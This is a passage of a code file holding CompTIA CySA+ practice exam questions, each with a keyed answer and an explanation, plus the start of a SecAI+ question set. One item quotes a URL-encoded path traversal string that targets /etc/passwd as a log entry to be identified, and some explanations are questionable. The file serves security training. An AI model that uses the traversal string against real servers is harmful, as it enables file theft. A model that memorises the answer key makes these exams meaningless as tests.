      "B. OSSTMM",
      "C. Diamond Model of Intrusion Analysis",
      "D. OWASP"
    ],
    "answer": "A",
    "explanation": "The MITRE ATT&CK framework is specifically designed for tracking Tactics, Techniques, and\nProcedures (TTPs) associated with cyber threats. It provides a detailed matrix of known adversarial\nbehaviors, which is useful for correlating SIEM data to known attack patterns. According to CompTIA\nCySA+, MITRE ATT&CK is an industry-standard framework for threat intelligence and behavior\nanalysis, making it the ideal tool for tracking malicious IP addresses and understanding their tactics.\nOther options like OSSTMM, the Diamond Model, and OWASP do not focus on TTPs as directly as\nMITRE ATT&CK does.",
    "image": null
  },
  {
    "id": "q-jc-355",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A SOC analyst observes reconnaissance activity from an IP address. The activity follows a pattern of\nshort bursts toward a low number of targets. An open-source review shows that the IP has a bad\nreputation. The perimeter firewall logs indicate the inbound traffic was allowed. The destination\nhosts are high-value assets with EDR agents installed. Which of the following is the best action for\nthe SOC to take to protect against any further activity from the source IP?",
    "options": [
      "A. Add the IP address to the EDR deny list.",
      "B. Create a SIEM signature to trigger on any activity from the source IP subnet for immediate notification.",
      "C. Implement a prevention policy for the IP on the WAF.",
      "D. Activate the scan signatures for the IP on the NGFWs."
    ],
    "answer": "A",
    "explanation": "Blocking the IP address at the EDR (Endpoint Detection and Response) level provides an immediate,\ntargeted response to the detected reconnaissance activity, preventing further interaction with the\nhigh-value assets. EDR tools are designed to detect and block malicious IPs across endpoints.\nAccording to CompTIA CySA+, this proactive step is effective for isolating and mitigating threats on\nspecific endpoints. While creating SIEM signatures (B) is useful for monitoring, and policies on WAF\n(C) and NGFWs (D) can provide additional layers of defense, the most immediate protective action is\nto block at the endpoint level.",
    "image": null
  },
  {
    "id": "q-jc-356",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is the best framework for assessing how attackers use techniques over an\ninfrastructure to exploit a target’s information assets?",
    "options": [
      "A. Structured Threat Information Expression",
      "B. OWASP Testing Guide",
      "C. Open Source Security Testing Methodology Manual",
      "D. Diamond Model of Intrusion Analysis"
    ],
    "answer": "D",
    "explanation": "The Diamond Model of Intrusion Analysis focuses on understanding the relationships between the\nadversary, their capabilities, infrastructure, and victim. It provides a structured approach to\nexamining how attackers exploit information assets. According to CompTIA CySA+, this model is\nvaluable for detailing attack patterns and understanding the infrastructure attackers use. The other\noptions, like Structured Threat Information Expression (A) and OWASP Testing Guide (B), address\nthreat data sharing and web application testing, respectively, while the Open Source Security Testing\nMethodology Manual (OSSTMM) (C) covers general security testing procedures.",
    "image": null
  },
  {
    "id": "q-jc-357",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 1.0: Security Operations",
    "question": "In the last hour, a high volume of failed RDP authentication attempts has been logged on a critical\nserver. All of the authentication attempts originated from the same remote IP address and made use\nof a single valid domain user account. Which of the following mitigating controls would be most\neffective to reduce the rate of success of this brute-force attack? (Select two).",
    "options": [
      "A. Increase the granularity of log-on event auditing on all devices.",
      "B. Enable host firewall rules to block all outbound traffic to TCP port 3389.",
      "C. Configure user account lockout after a limited number of failed attempts.",
      "D. Implement a firewall block for the IP address of the remote system.",
      "E. Install a third-party remote access tool and disable RDP on all devices.",
      "F. Block inbound to TCP port 3389 from untrusted remote IP addresses at the perimeter firewall."
    ],
    "answer": [
      "C",
      "F"
    ],
    "explanation": "C. Configure user account lockout after a limited number of failed attempts and F. Block inbound TCP port 3389 from untrusted remote IP addresses are the two correct immediate mitigations for a brute-force RDP attack. Account lockout (C) automatically disables the target account after N failed attempts, stopping the brute-force from succeeding. Blocking port 3389 from untrusted IPs (F) at the firewall level prevents the attacking IP range from reaching RDP entirely. Increasing audit granularity (A) improves visibility but does not stop the attack. Blocking ALL outbound traffic (B) is too disruptive. Installing a third-party remote tool (E) and disabling RDP has merit but is a longer-term solution, not an immediate mitigation for an active attack.",
    "image": null
  },
  {
    "id": "q-jc-358",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A SOC receives several alerts indicating user accounts are connecting to the company’s identity\nprovider through non-secure communications. User credentials for accessing sensitive, business-\ncritical systems could be exposed. Which of the following logs should the SOC use when determining\nmalicious intent?",
    "options": [
      "A. DNS",
      "B. tcpdump",
      "C. Directory",
      "D. IDS"
    ],
    "answer": "D",
    "explanation": "Intrusion Detection Systems (IDS) logs provide visibility into network traffic patterns and can help\ndetect insecure or unusual connections. These logs will show if non-secure protocols are used,\npotentially revealing exposed credentials. According to CompTIA CySA+, IDS logs are essential for\nidentifying malicious activity related to communications and network intrusions. Options like DNS\n(A) and tcpdump (B) provide network details, but IDS specifically monitors for intrusions and unusual\nactivities relevant to security incidents.",
    "image": null
  },
  {
    "id": "q-jc-359",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following characteristics ensures the security of an automated information system is\nthe most effective and economical?",
    "options": [
      "A. Originally designed to provide necessary security",
      "B. Subjected to intense security testing",
      "C. Customized to meet specific security threats",
      "D. Optimized prior to the addition of security"
    ],
    "answer": "A",
    "explanation": "Comprehensive Detailed\nThe most effective and economical way to ensure the security of an automated information system is\nto design it with security in mind from the outset. This is often referred to as \"security by design.\"\nHere’s a breakdown of each option and why option A is correct:\nA . Originally designed to provide necessary security\nSystems designed with security from the beginning integrate secure practices and considerations\nduring the development process. This approach mitigates the need for costly and complex\nretroactive security implementations, which are common in systems where security was an\nafterthought.\nCost Efficiency: Security implementations at the design stage can be embedded into the system\narchitecture, reducing the costs associated with later modifications.\nEffectiveness: Security-by-design approaches often result in robust systems that are more resilient to\nvulnerabilities because they address security concerns at each development phase.\nB . Subjected to intense security testing\nWhile rigorous security testing (such as penetration testing and vulnerability assessments) is\nessential, it is reactive. Security testing is more effective when applied to systems already designed\nwith foundational security principles, ensuring that tests identify potential flaws in an inherently\nsecure system.\nC . Customized to meet specific security threats\nCustomizing security to meet specific threats addresses unique risks, but such a targeted approach\nmay miss new or emerging threats not initially considered. It also risks neglecting fundamental\nsecurity practices that apply universally, leading to potential vulnerabilities.\nD . Optimized prior to the addition of security\nOptimizing a system before adding security features may enhance performance but does not\nguarantee security. Security cannot be effectively added onto a system as an afterthought without\nincurring additional costs or creating potential weaknesses.\nReference:\nNIST SP 800-160: Systems Security Engineering, which emphasizes designing systems with security\nintegrated from the beginning.\nOWASP Security by Design Principles: Explores how security considerations are most effective when\nincluded early in development.",
    "image": null
  },
  {
    "id": "q-jc-360",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An XSS vulnerability was reported on one of the public websites of a company. The security\ndepartment confirmed the finding and needs to provide a recommendation to the application owner.\nWhich of the following recommendations will best prevent this vulnerability from being exploited?\n(Select two).",
    "options": [
      "A. Implement an IPS in front of the web server.",
      "B. Enable MFA on the website.",
      "C. Take the website offline until it is patched.",
      "D. Implement a compensating control in the source code.",
      "E. Configure TLS v1.3 on the website.",
      "F. Fix the vulnerability using a virtual patch at the WAF."
    ],
    "answer": [
      "D",
      "F"
    ],
    "explanation": "Comprehensive Detailed\nTo effectively prevent Cross-Site Scripting (XSS) attacks, implementing appropriate security controls\nwithin the application code and at the network layer is critical. Here’s a breakdown of each option:\nA . Implement an IPS in front of the web server\nIntrusion Prevention Systems (IPS) are primarily designed to detect and prevent network-based\nattacks, not application-layer vulnerabilities such as XSS. They do not specifically mitigate XSS threats\neffectively.\nB. Enable MFA on the website\nMulti-factor authentication (MFA) strengthens user authentication but does not address XSS, which\ntypically involves injecting malicious scripts rather than compromising user credentials.\nC . Take the website offline until it is patched\nWhile this might temporarily mitigate the risk, it is not a practical solution for ongoing operations,\nespecially when effective preventative controls (e.g., WAF rules or code updates) can be\nimplemented without disabling the service.\nD . Implement a compensating control in the source code\nImplementing security controls at the code level is an effective way to mitigate XSS risks. This can\ninvolve proper input validation, output encoding, and utilizing libraries that sanitize user inputs. By\naddressing the root cause in the source code, developers prevent scripts from being injected or\nexecuted in the browser.\nE . Configure TLS v1.3 on the website\nWhile TLS v1.3 secures the communication channel, it does not address XSS directly. XSS attacks\nmanipulate client-side scripts, which TLS cannot prevent, as TLS only encrypts data in transit.\nF . Fix the vulnerability using a virtual patch at the WAF\nWeb Application Firewalls (WAFs) can mitigate XSS vulnerabilities by identifying and blocking\nmalicious payloads. Virtual patching at the WAF level provides a temporary fix by preventing exploit\nattempts from reaching the application, giving developers time to implement a permanent fix in the\nsource code.\nReference:\nOWASP XSS Prevention Cheat Sheet: Detailed guidance on encoding, sanitizing, and safe coding\npractices to prevent XSS.\nNIST SP 800-44: Guidelines on Web Security, discussing WAFs and application-layer protections.\nCWE-79: Common Weakness Enumeration on Cross-Site Scripting, which outlines ways to address\nand prevent XSS attacks.",
    "image": null
  },
  {
    "id": "q-jc-361",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst needs to identify a computer based on the following requirements to be mitigated:\nThe attack method is network-based with low complexity.\nNo privileges or user action is needed.\nThe confidentiality and availability level is high, with a low integrity level.\nGiven the following CVSS 3.1 output:\nComputer1: CVSS3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:H\nComputer2: CVSS3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:H\nComputer3: CVSS3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:H\nComputer4: CVSS3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:H\nWhich of the following machines should the analyst mitigate?",
    "options": [
      "A. Computer1",
      "B. Computer2",
      "C. Computer3",
      "D. Computer4"
    ],
    "answer": "D",
    "explanation": "Comprehensive Detailed\nTo match the mitigation criteria, we analyze each machine’s CVSS (Common Vulnerability Scoring\nSystem) attributes:\nAttack Vector (AV): N for network (matches the requirement of network-based attack).\nAttack Complexity (AC): L for low (meets the requirement for low complexity).\nPrivileges Required (PR): N for none (indicating no privileges are needed).\nUser Interaction (UI): N for none (matches the requirement that no user action is needed).\nConfidentiality (C), Integrity (I), and Availability (A): Requires high confidentiality and availability with\nlow integrity.\nFrom these criteria:\nComputer1 requires user interaction (UI:R), which disqualifies it.\nComputer2 has a local attack vector (AV:L), which disqualifies it for a network-based attack.\nComputer3 has a high attack complexity (AC:H), which does not meet the low complexity\nrequirement.\nComputer4 meets all criteria: network attack vector, low complexity, no privileges, no user\ninteraction, and appropriate confidentiality, integrity, and availability levels.\nThus, Computer4 is the correct answer.\nReference:\nNIST NVD (National Vulnerability Database): CVSS vector standards.\nCVSS 3.1 User Guide: Explanation of each CVSS metric and its application in vulnerability\nprioritization.",
    "image": null
  },
  {
    "id": "q-jc-362",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Which of the following are process improvements that can be realized by implementing a SOAR\nsolution? (Select two).",
    "options": [
      "A. Minimize security attacks",
      "B. Itemize tasks for approval",
      "C. Reduce repetitive tasks",
      "D. Minimize setup complexity",
      "E. Define a security strategy",
      "F. Generate reports and metrics"
    ],
    "answer": [
      "C",
      "F"
    ],
    "explanation": "Comprehensive Detailed\nSOAR (Security Orchestration, Automation, and Response) solutions are implemented to streamline\nsecurity operations and improve efficiency. Key benefits include:\nC . Reduce repetitive tasks: SOAR solutions automate routine and repetitive tasks, which helps\nreduce analyst workload and minimize human error.\nF . Generate reports and metrics: SOAR platforms can automatically generate comprehensive reports\nand performance metrics, allowing organizations to track incident response times, analyze trends,\nand optimize security processes.\nOther options are less relevant to the core functions of SOAR:\nA . Minimize security attacks: While SOAR can aid in quicker response, it does not directly minimize\nthe occurrence of attacks.\nB . Itemize tasks for approval: Task itemization for approval is more relevant to project management\ntools.\nD . Minimize setup complexity: SOAR solutions often require significant setup and integration with\nexisting tools.\nE . Define a security strategy: SOAR is more focused on automating response rather than strategy\ndefinition.\nReference:\nGartner's Guide on SOAR Solutions: Discusses automation and reporting features.\nNIST SP 800-61: Computer Security Incident Handling Guide, on the value of automation in incident\nresponse.",
    "image": null
  },
  {
    "id": "q-jc-363",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "After an upgrade to a new EDR, a security analyst received reports that several endpoints were not\ncommunicating with the SaaS provider to receive critical threat signatures. To comply with the\nincident response playbook, the security analyst was required to validate connectivity to ensure\ncommunications. The security analyst ran a command that provided the following output:\nComputerName: comptia007\nRemotePort: 443\nInterfaceAlias: Ethernet 3\nTcpTestSucceeded: False\nWhich of the following did the analyst use to ensure connectivity?",
    "options": [
      "A. nmap",
      "B. tnc",
      "C. ping",
      "D. tracert"
    ],
    "answer": "B",
    "explanation": "Comprehensive Detailed\nThe command output shown indicates that the analyst used a TCP connection test to check if\ncommunication on port 443 (usually HTTPS) succeeded. Here’s why each option was or was not\nsuitable:\nA . nmap: While nmap can scan ports, it does not provide direct feedback on connection success or\nfailure in the manner shown.\nB . tnc (Test-NetConnection in PowerShell): This command in PowerShell is specifically designed to\ntest connectivity to a specified port and IP address. The output (TcpTestSucceeded: False) is\ncharacteristic of the tnc command.\nC . ping: The ping command only tests ICMP echo replies and does not indicate success or failure on\nspecific ports.\nD . tracert: tracert traces the path packets take to reach a host but does not provide a direct\nindication of port availability or success.\nReference:\nMicrosoft PowerShell Documentation: Test-NetConnection cmdlet, which details TCP port testing.\nNIST SP 800-115: Technical Guide to Information Security Testing and Assessment, covering\nconnectivity testing methods.",
    "image": null
  },
  {
    "id": "q-jc-364",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An employee received a phishing email that contained malware targeting the company. Which of the\nfollowing is the best way for a security analyst to get more details about the malware and avoid\ndisclosing information?",
    "options": [
      "A. Upload the malware to the VirusTotal website",
      "B. Share the malware with the EDR provider",
      "C. Hire an external consultant to perform the analysis",
      "D. Use a local sandbox in a microsegmented environment"
    ],
    "answer": "D",
    "explanation": "Comprehensive Detailed\nTo safely analyze malware while avoiding unintended disclosure of company information, it is best to\nuse a local sandbox in a microsegmented environment. Here’s why:\nA . Upload the malware to the VirusTotal website\nRisk: VirusTotal and similar services are public and may share uploaded files with other security\nvendors, potentially exposing proprietary or sensitive information.\nB . Share the malware with the EDR provider\nLimitation: While EDR providers may offer insight, sharing potentially sensitive malware samples\nexternally still introduces risk of disclosure or data leaks.\nC . Hire an external consultant to perform the analysis\nCost and Risk: Hiring an external consultant can be costly and may introduce risks related to third-\nparty handling of sensitive data. Although it may provide insights, this is typically not the most\nefficient initial response.\nD . Use a local sandbox in a microsegmented environment\nA local sandbox provides a secure, isolated environment for malware analysis without exposing\nsensitive data outside the organization. Microsegmentation enhances security by further isolating\nthe sandbox from the network, preventing lateral movement if the malware attempts to\ncommunicate externally.\nReference:\nNIST SP 800-83: Guide to Malware Incident Prevention and Handling for Desktops and Laptops.\nMITRE ATT&CK: Techniques and recommendations for malware analysis in isolated environments.",
    "image": null
  },
  {
    "id": "q-jc-365",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst needs to develop a solution to protect a high-value asset from an exploit like a\nrecent zero-day attack. Which of the following best describes this risk management strategy?",
    "options": [
      "A. Avoid",
      "B. Transfer",
      "C. Accept",
      "D. Mitigate"
    ],
    "answer": "D",
    "explanation": "Comprehensive Detailed\nThe best approach to address the risk of a zero-day attack is mitigation. Here’s an explanation of each\noption:\nA . Avoid\nAvoiding risk would mean discontinuing the use of the asset, which is not feasible for high-value\nassets that are essential to operations.\nB . Transfer\nTransferring risk would involve outsourcing or obtaining insurance, but this does not directly reduce\nthe threat of a zero-day exploit.\nC . Accept\nAccepting the risk means acknowledging it without implementing countermeasures, which is not\nadvisable for high-value assets at risk from sophisticated attacks.\nD . Mitigate\nMitigation involves implementing technical or administrative controls to reduce the impact of an\nattack. For zero-day exploits, this could include installing network-based protections, enhancing\nmonitoring, or applying threat intelligence to detect or contain potential exploit attempts.\nReference:\nNIST SP 800-30: Guide for Conducting Risk Assessments.\nOWASP Risk Rating Methodology: Techniques for assessing and mitigating security risks.",
    "image": null
  },
  {
    "id": "q-jc-366",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Which of the following documents sets requirements and metrics for a third-party response during\nan event?",
    "options": [
      "A. BIA",
      "B. DRP",
      "C. SLA",
      "D. MOU"
    ],
    "answer": "C",
    "explanation": "Comprehensive Detailed\nA Service Level Agreement (SLA) defines the expectations, requirements, and metrics for third-party\nservices, including response times and responsibilities during an event. Here’s an overview of each\noption:\nA . BIA (Business Impact Analysis)\nBIA is used to assess potential impacts of disruptions to business operations, but it does not specify\nthird-party response requirements.\nB . DRP (Disaster Recovery Plan)\nDRP provides recovery procedures for internal systems and services but does not directly establish\nthird-party obligations.\nC . SLA (Service Level Agreement)\nSLAs set clear expectations for third-party services, including response times, performance metrics,\nand specific requirements during incidents. SLAs ensure accountability for external providers during\ncritical events.\nD . MOU (Memorandum of Understanding)\nAn MOU defines general terms and intentions between parties but lacks the specific performance\nmetrics required in an SLA.\nReference:\nNIST SP 800-37: Risk Management Framework, on the role of SLAs in managing third-party risk.\nITIL Service Design: Importance of SLAs for defining service performance and response requirements.",
    "image": null
  },
  {
    "id": "q-jc-367",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst runs the following command:\n# nmap -T4 -F 192.168.30.30\nStarting nmap 7.6\nHost is up (0.13s latency)\nPORT\nSTATE SERVICE\n23/tcp open\ntelnet\n443/tcp open\nhttps\n636/tcp open\nldaps\nWhich of the following should the analyst recommend first to harden the system?",
    "options": [
      "A. Disable all protocols that do not use encryption.",
      "B. Configure client certificates for domain services.",
      "C. Ensure that this system is behind a NGFW.",
      "D. Deploy a publicly trusted root CA for secure websites."
    ],
    "answer": "A",
    "explanation": "Comprehensive Detailed\nThe nmap scan results show that Telnet (port 23) is open. Telnet transmits data, including\ncredentials, in plaintext, which is insecure and should be disabled to enhance security. Here’s an\nexplanation of each option:\nA . Disable all protocols that do not use encryption\nDisabling unencrypted protocols (such as Telnet) reduces exposure to man-in-the-middle (MITM)\nattacks and credential sniffing. Telnet should be replaced with a secure protocol like SSH, which\nprovides encryption for transmitted data.\nB . Configure client certificates for domain services\nWhile client certificates enhance authentication security, they are more relevant to services like\nLDAP over SSL (port 636), which is already secure. This would not address the Telnet vulnerability.\nC . Ensure that this system is behind a NGFW\nA Next-Generation Firewall (NGFW) provides enhanced network security, but it may not mitigate the\nrisks of unencrypted protocols if they are allowed internally.\nD . Deploy a publicly trusted root CA for secure websites\nPublic root CAs are used for website authentication and encryption, relevant only if this system is\nhosting a publicly accessible HTTPS service. It would not impact Telnet security.\nReference:\nCIS Controls: Recommendations on secure configurations, especially the use of encrypted protocols.\nNIST SP 800-47: Security considerations for network protocols, emphasizing encrypted alternatives\nlike SSH over Telnet.",
    "image": null
  },
  {
    "id": "q-jc-368",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst reviews the following web server log entries:\n%2E%2E/%2E%2E/%2ES2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd\nNo attacks or malicious attempts have been discovered. Which of the following most likely describes\nwhat took place?",
    "options": [
      "A. A SQL injection query took place to gather information from a sensitive file.",
      "B. A PHP injection was leveraged to ensure that the sensitive file could be accessed.",
      "C. Base64 was used to prevent the IPS from detecting the fully encoded string.",
      "D. Directory traversal was performed to obtain a sensitive file for further reconnaissance."
    ],
    "answer": "D",
    "explanation": "Comprehensive and Detailed Step-by-Step\nDirectory traversal, also known as path traversal, is an attack that allows attackers to access restricted\ndirectories and execute commands outside the web server's root directory. The %2E encoding\ncorresponds to a dot (.) in ASCII, and %2E%2E resolves to ../. The log entries indicate attempts to\nnavigate directories upward to access sensitive files like /etc/passwd. Since no malicious activity was\nflagged, it is inferred this was either an unsuccessful or reconnaissance attempt.\nReference:\nCompTIA CySA+ Study Guide (Chapter 3: Malicious Activity, Page 79) \nCompTIA CySA+ Objectives (Domain 1.2 - Indicators of Potentially Malicious Activity)",
    "image": null
  },
  {
    "id": "q-jc-369",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "The Chief Information Security Officer wants the same level of security to be present whether a\nremote worker logs in at home or at a coffee shop. Which of the following should be recommended\nas a starting point?",
    "options": [
      "A. Non-persistent virtual desktop infrastructures",
      "B. Passwordless authentication",
      "C. Standard-issue laptops",
      "D. Serverless workloads"
    ],
    "answer": "A",
    "explanation": "Comprehensive and Detailed Step-by-Step\nNon-persistent virtual desktop infrastructures (VDIs) are the most suitable choice to ensure\nconsistent security across different locations. Non-persistent VDIs revert to their original state after a\nsession, reducing the risk of data leakage or malware persistence. These systems are centrally\nmanaged, ensuring uniform security policies regardless of the user's location.\nReference:\nCompTIA CySA+ All-in-One Guide (Chapter 1: System and Network Architecture) \nCompTIA CySA+ Objectives (Domain 1.1 - Infrastructure Concepts)",
    "image": null
  },
  {
    "id": "q-jc-370",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is the best use of automation in cybersecurity?",
    "options": [
      "A. Ensure faster incident detection, analysis, and response.",
      "B. Eliminate configuration errors when implementing new hardware.",
      "C. Lower costs by reducing the number of necessary staff.",
      "D. Reduce the time for internal user access requests."
    ],
    "answer": "A",
    "explanation": "Comprehensive and Detailed Step-by-Step\nAutomation in cybersecurity is best utilized to improve the speed and accuracy of incident detection,\nanalysis, and response. Tools like SOAR (Security Orchestration, Automation, and Response)\nstreamline workflows, allowing analysts to focus on more complex tasks while reducing response\ntimes. This ensures quicker containment and mitigation of threats.\nReference:\nCompTIA CySA+ Study Guide (Chapter 1: Cybersecurity Automation, Page 28) \nCompTIA CySA+ Practice Tests (Domain 1.3 Tools for Malicious Activity, Page 13)",
    "image": null
  },
  {
    "id": "q-jc-371",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following is the appropriate phase in the incident response process to perform a\nvulnerability scan to determine the effectiveness of corrective actions?",
    "options": [
      "A. Lessons learned",
      "B. Reporting",
      "C. Recovery",
      "D. Root cause analysis"
    ],
    "answer": "C",
    "explanation": "Comprehensive and Detailed Step-by-Step\nPerforming a vulnerability scan during the recovery phase ensures that corrective actions, such as\npatches or configuration changes, have effectively addressed the vulnerabilities exploited during the\nincident. This step validates the system’s security before fully restoring operations.\nReference:\nCompTIA CySA+ Objectives (Domain 3.0 - Incident Response) \nCompTIA CySA+ Practice Tests (Chapter 3: Containment, Eradication, and Recovery)",
    "image": null
  },
  {
    "id": "q-jc-372",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following risk management decisions should be considered after evaluating all other\noptions?",
    "options": [
      "A. Transfer",
      "B. Acceptance",
      "C. Mitigation",
      "D. Avoidance"
    ],
    "answer": "B",
    "explanation": "Comprehensive and Detailed Step-by-Step\nRisk acceptance is the decision to accept the risk's consequences when mitigation, transfer, or\navoidance are not feasible or cost-effective. It is chosen when the residual risk aligns with the\norganization’s risk appetite. This step occurs after thoroughly assessing other options.\nReference:\nCompTIA CySA+ All-in-One Guide (Chapter 13: Risk Management Principles) \nCompTIA CySA+ Study Guide (Chapter 2: Risk Management, Page 85)",
    "image": null
  },
  {
    "id": "q-jc-373",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst receives an alert for suspicious IIS log activity and reviews the following entries:\n2024-05-23 15:57:05 10.203.10.16 HEAT / - 80 - 10.203.10.17 DirBuster-1.0-\nRC1+(http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)\n...\nWhich of the following will the analyst infer from the logs?",
    "options": [
      "A. An attacker is performing network lateral movement.",
      "B. An attacker is conducting reconnaissance of the website.",
      "C. An attacker is exfiltrating data from the network.",
      "D. An attacker is cloning the website."
    ],
    "answer": "B",
    "explanation": "Comprehensive and Detailed Step-by-Step\nThe logs indicate that the OWASP DirBuster tool is being used. This tool is designed for directory\nbrute-forcing to find hidden files or directories on a web server, which aligns with reconnaissance\nactivities. The series of GET and HEAD requests further confirm directory and file enumeration\nattempts.\nReference:\nCompTIA CySA+ Study Guide (Chapter 4: Reconnaissance Techniques) \nCompTIA CySA+ Objectives (Domain 1.3 Tools and Techniques)",
    "image": null
  },
  {
    "id": "q-jc-374",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst reviews a SIEM alert related to a suspicious email and wants to verify the\nauthenticity of the message:\nSPF = PASS\nDKIM = FAIL\nDMARC = FAIL\nWhich of the following did the analyst most likely discover?",
    "options": [
      "A. An insider threat altered email security records to mask suspicious DNS resolution traffic.",
      "B. The message was sent from an authorized mail server but was not signed.",
      "C. Log normalization corrupted the data as it was brought into the central repository.",
      "D. The email security software did not process all of the records correctly."
    ],
    "answer": "B",
    "explanation": "Comprehensive and Detailed Step-by-Step\nThe SPF = PASS result confirms the email came from an authorized server, but DKIM = FAIL indicates\nthe message was not properly signed with the expected DomainKeys Identified Mail (DKIM)\nsignature. DMARC = FAIL suggests that because DKIM failed, the overall email authentication failed.\nThis scenario is consistent with a legitimate server sending an unsigned email.\nReference:\nCompTIA CySA+ All-in-One Guide (Chapter 5: Email Analysis) \nCompTIA CySA+ Practice Tests (Domain 1.3 Email Authentication)",
    "image": null
  },
  {
    "id": "q-jc-375",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following is a KPI that is used to monitor or report on the effectiveness of an incident\nresponse reporting and communication program?",
    "options": [
      "A. Incident volume",
      "B. Mean time to detect",
      "C. Average time to patch",
      "D. Remediated incidents"
    ],
    "answer": "D",
    "explanation": "Comprehensive and Detailed Step-by-Step\nRemediated incidents is a key performance indicator (KPI) that measures how effectively incidents\nare resolved and communicated during the incident response lifecycle. It reflects the program's\nsuccess in mitigating risks and restoring normal operations. Other options (e.g., mean time to detect)\nare important metrics but do not directly measure reporting or communication effectiveness.\nReference:\nCompTIA CySA+ Study Guide (Chapter 4: Reporting and Metrics, Page 425) \nCompTIA CySA+ Objectives (Domain 4.0 - Reporting and Communication)",
    "image": null
  },
  {
    "id": "q-jc-376",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following ensures that a team receives simulated threats to evaluate incident response\nperformance and coordination?",
    "options": [
      "A. Vulnerability assessment",
      "B. Incident response playbooks",
      "C. Tabletop exercise",
      "D. Cybersecurity frameworks"
    ],
    "answer": "C",
    "explanation": "Comprehensive and Detailed Step-by-Step\nA tabletop exercise is a structured simulation that allows teams to practice and evaluate their\nincident response procedures and coordination without actual operational impact. These exercises\nare used to identify gaps in processes and ensure preparedness for real-world threats.\nReference:\nCompTIA CySA+ All-in-One Guide (Chapter 3: Incident Response Procedures) \nCompTIA CySA+ Practice Tests (Domain 3.0 Incident Response)",
    "image": null
  },
  {
    "id": "q-jc-377",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An organization is planning to adopt a zero-trust architecture. Which of the following is most aligned\nwith this approach?",
    "options": [
      "A. Network segmentation to separate sensitive systems from the rest of the network.",
      "B. Whitelisting specific IP addresses that are allowed to access the network.",
      "C. Trusting users who successfully authenticate once with multifactor authentication.",
      "D. Automatically trusting internal network communications over external traffic."
    ],
    "answer": "A",
    "explanation": "Comprehensive and Detailed Step-by-Step\nNetwork segmentation supports zero-trust principles by ensuring sensitive systems are isolated and\naccess is restricted based on identity, role, and context. Unlike traditional models, zero-trust\narchitecture does not automatically trust authenticated users or internal network traffic. It enforces\nstrict access controls to minimize risk.\nReference:\nCompTIA CySA+ Study Guide (Chapter 2: Zero Trust and Network Segmentation, Page 52) \nCompTIA CySA+ Objectives (Domain 1.1 - Zero Trust Architecture) \nThank You for Purchasing CS0-003 PDF\n[Offer] Improve Your Exam\nPreparation with our Practice\nExam Software\nUse Coupon “20OFF” for special 20% discount on the purchase of\nPractice Test Software. Practice Exam Software helps you validate\nyour preparation in a simulated exam environment.\nDownload Free Practice Test Demo from our site:\n/comptia/CS0-003.html",
    "image": null
  }
];

// CompTIA SecAI+ (CY0-001) Questions
const SECAI_QUESTIONS = [
  {
    "id": "cy0-1",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: AI Governance, Risk, and Compliance",
    "question": "Which of the following job roles in an organizational governance structure develops a model from business use cases?",
    "options": [
      "A. Platform architect",
      "B. AI risk analyst",
      "C. Machine learning operations (MLOps) engineer",
      "D. Data scientist"
    ],
    "answer": "D",
    "explanation": "Source: ITExams CY0-001 Question #1. Community-verified answer.",
    "image": null
  },
  {
    "id": "cy0-2",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Securing AI Systems",
    "question": "An administrator, who works for a financial institution, is required to implement data security controls for data at rest within AI systems that involve data disclosure. Which of the following is the most suitable control?",
    "options": [
      "A. Data lineage",
      "B. Rate limits",
      "C. Encryption",
